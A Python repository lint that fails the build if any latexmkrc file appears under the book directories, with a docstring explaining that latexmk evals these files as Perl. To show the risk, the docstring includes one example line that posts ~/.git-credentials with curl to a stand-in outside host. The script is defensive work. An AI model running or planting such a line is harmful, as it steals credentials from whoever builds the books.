#!/usr/bin/env python3
"""Refuse to let a ``latexmkrc`` live anywhere latexmk would ``eval`` it.

Why this script exists
----------------------

``latexmk`` reads ``latexmkrc`` and ``.latexmkrc`` **from its current working
directory** and hands the contents to Perl's ``eval``. Not "parses as config" —
``eval``. Anything in that file runs, as the user running latexmk, before a
single line of TeX is looked at::

    # <track>/book/latexmkrc
    system("curl -d @$ENV{HOME}/.git-credentials https://elsewhere.example");

Every book in this repository is compiled with latexmk's working directory set
to ``code/learning/human-languages/<track>/book`` — a directory whose contents
arrive by pull request. So the file that gets ``eval``-ed is repository content,
and a pull request that adds one is a pull request that runs code on whatever
machine builds the books.

The primary control for that is ``latexmk -norc``, which stops the directory
being consulted at all. Every invocation in this repository passes it: the CI
job, ``check-book-compile.sh``, ``build-books-locally.sh``,
``verify-human-languages.sh``, and each track's own ``book/build.sh`` and
``build.ps1``.

This script is the *second* control, and it exists because the first one is a
flag — and a flag is only present where somebody remembered to type it. That is
not a hypothetical failure mode here: the CI job compiled every book **without**
``-norc`` for the whole time the local scripts had it, because the hardening was
added to the scripts and nobody swept the workflow. A flag protects the call
sites you fixed. A repository lint protects the ones you have not written yet.

So: the payload simply must not be in the tree. If it is not there, no missed
flag can matter.

What counts as a hit
--------------------

``latexmk`` consults exactly two names in its working directory, in this order:

===================  ==========================================================
``latexmkrc``        checked first
``.latexmkrc``       checked second
===================  ==========================================================

Both are matched **case-insensitively**. latexmk itself is case-sensitive about
them on Linux, where CI runs — but the repository is also checked out on Windows
and macOS, whose filesystems are not, and a ``LatexmkRC`` committed from a
case-insensitive checkout is a ``latexmkrc`` to everybody else. Matching loosely
costs nothing: no legitimate file in this tree is called any casing of that.

"Absent" and "could not determine" are different answers
--------------------------------------------------------

A directory this script could not read is **not** a directory with no
``latexmkrc`` in it. Reporting the second when it means the first is how a
security gate goes quietly green while checking nothing, so every unreadable
path is reported as ``COULD NOT DETERMINE``, names its ``errno``, and fails the
run just as loudly as a real hit would::

    COULD NOT DETERMINE  code/learning/human-languages/hindi/book
      OSError EACCES (13): Permission denied

Exit status
-----------

===  =========================================================================
0    every directory under the book root was read, and none holds a latexmkrc
1    at least one ``latexmkrc`` was found
2    at least one directory could not be read, so the answer is unknown
===  =========================================================================

Usage
-----

::

    python3 code/scripts/check_no_book_latexmkrc.py \\
        --book-root code/learning/human-languages
"""

from __future__ import annotations

import argparse
import errno
import os
import sys
from pathlib import Path

# The two names latexmk consults in its working directory, lowercased for the
# case-insensitive comparison described above.
FORBIDDEN_NAMES = frozenset({"latexmkrc", ".latexmkrc"})


def describe_oserror(error: OSError) -> str:
    """Render an OSError so a reader can act on it without guessing.

    ``errno`` is included by *name* as well as number because "13" means
    nothing at a glance and ``EACCES`` means "fix the permissions". A stray
    OSError with no errno at all (it happens on Windows for some shapes) is
    reported as ``errno=None`` rather than being smoothed over into a plausible
    lie.
    """
    code = error.errno
    name = errno.errorcode.get(code, "?") if code is not None else "None"
    detail = error.strerror or str(error) or error.__class__.__name__
    return f"OSError {name} ({code}): {detail}"


def scan(book_root: Path) -> tuple[list[Path], list[tuple[Path, OSError]]]:
    """Walk ``book_root`` and return ``(hits, unreadable)``.

    ``os.walk`` swallows errors by default — it simply yields nothing for a
    directory it cannot open, which would turn "unreadable" into "empty" at the
    exact moment that distinction matters most. The ``onerror`` hook is what
    keeps the two apart.
    """
    hits: list[Path] = []
    unreadable: list[tuple[Path, OSError]] = []

    def on_error(error: OSError) -> None:
        raw = getattr(error, "filename", None)
        unreadable.append((Path(raw) if raw else book_root, error))

    for dirpath, _dirnames, filenames in os.walk(book_root, onerror=on_error):
        for filename in filenames:
            if filename.lower() in FORBIDDEN_NAMES:
                hits.append(Path(dirpath) / filename)

    return sorted(hits), unreadable


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "--book-root",
        default="code/learning/human-languages",
        type=Path,
        help="directory tree to scan (default: %(default)s)",
    )
    args = parser.parse_args(argv)
    book_root: Path = args.book_root

    # A missing root is "could not determine", not "clean". Scanning a path
    # that is not there and reporting success is the same conflation this
    # script exists to avoid, one level up.
    try:
        resolved = book_root.resolve(strict=True)
    except OSError as error:
        print(f"COULD NOT DETERMINE  {book_root}", file=sys.stderr)
        print(f"  {describe_oserror(error)}", file=sys.stderr)
        return 2
    if not resolved.is_dir():
        print(f"COULD NOT DETERMINE  {book_root}", file=sys.stderr)
        print(f"  OSError ENOTDIR ({errno.ENOTDIR}): not a directory", file=sys.stderr)
        return 2

    hits, unreadable = scan(resolved)

    for path, error in unreadable:
        print(f"COULD NOT DETERMINE  {path}", file=sys.stderr)
        print(f"  {describe_oserror(error)}", file=sys.stderr)

    for hit in hits:
        print(f"FORBIDDEN            {hit}", file=sys.stderr)

    if hits:
        print(
            "\nlatexmk `eval`s these as Perl when its working directory is the "
            "one holding them.\nDelete the file. If a book genuinely needs a "
            "latexmk setting, add it to\ncode/scripts/latexmk-safe.rc, which is "
            "loaded explicitly with `-norc -r` and is\nreviewed like any other "
            "script.",
            file=sys.stderr,
        )
        return 1

    if unreadable:
        print(
            f"\n{len(unreadable)} path(s) could not be read, so this run did not "
            "establish that the\ntree is clean. That is not the same as finding "
            "nothing.",
            file=sys.stderr,
        )
        return 2

    print(f"no latexmkrc under {resolved}")
    return 0


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
